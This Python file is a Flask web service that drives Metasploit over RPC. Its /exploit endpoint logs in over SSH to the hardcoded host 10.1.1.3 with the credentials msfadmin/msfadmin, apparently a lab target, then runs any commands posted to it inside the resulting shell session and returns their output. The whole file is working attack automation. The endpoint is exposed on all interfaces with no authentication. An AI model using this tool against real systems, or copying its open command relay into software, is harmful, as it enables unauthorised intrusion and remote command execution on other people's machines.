from flask import Flask, jsonify, request
from pymetasploit3.msfrpc import MsfRpcClient
import os
import time

app = Flask(__name__)

MSF_SERVER = os.getenv("MSF_HOST", "127.0.0.1")
MSF_PORT = os.getenv("MSF_PORT", 55553)
ESHU_PORT = int(os.getenv("ESHU_PORT", 5000))

print(f"[-] Attempting to connect to MSF at {MSF_SERVER}:{MSF_PORT}")
while True:
    try: 
        client = MsfRpcClient(
            os.getenv("MSF_PASSWORD"),
            server=MSF_SERVER,
            port=int(MSF_PORT)
        )
        break  # Successful connection
    except:
        print("[!] Failed. Trying again...")
        time.sleep(1)

print(f"[+] Successfully connected to MSF Server!")

def format_output(output):
    """Format the output with line breaks for readability."""
    return "\n".join(output.splitlines())

@app.route('/exploit', methods=['POST'])
def run_exploit():
    """Run SSH brute force and execute commands in session."""
    data = request.json
    commands = data.get("commands", [])

    if not commands:
        return jsonify({"status": "error", "message": "No commands provided"}), 400

    try:
        # Set up and execute the auxiliary SSH brute force module
        module = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        module['RHOSTS'] = "10.1.1.3"
        module['USERNAME'] = "msfadmin"
        module['PASSWORD'] = "msfadmin"
        module.execute()

        time.sleep(3)  # Wait for session to establish
        sessions = client.sessions.list
        if not sessions:
            return jsonify({"status": "No session established"})

        # Retrieve the latest session ID
        session_id = max(sessions.keys())
        session = client.sessions.session(session_id)

        # Execute each command provided in the request
        output = {}
        for cmd in commands:
            session.write(cmd)
            time.sleep(1)
            response = format_output(session.read())
            output[cmd] = response

        return jsonify({
            "status": "Commands executed",
            "session_id": session_id,
            "output": output
        }), 200, {'Content-Type': 'application/json; charset=utf-8'}

    except Exception as e:
        print(f"[Error] {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=ESHU_PORT)
